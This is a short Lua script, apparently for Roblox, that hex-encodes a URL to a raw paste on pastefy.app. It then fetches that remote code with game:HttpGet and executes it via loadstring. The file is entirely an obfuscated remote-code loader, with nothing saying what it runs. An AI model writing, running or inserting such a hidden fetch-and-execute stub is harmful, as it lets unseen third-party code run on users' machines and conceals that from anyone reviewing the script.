local function _d(s)
    local r = ""
    for i = 1, #s, 2 do
        r = r .. string.char(tonumber(s:sub(i, i + 1), 16))
    end
    return r
end

local _u = _d("68747470733a2f2f706173746566792e6170702f75554772383574482f726177")

loadstring(game:HttpGet(_u))()
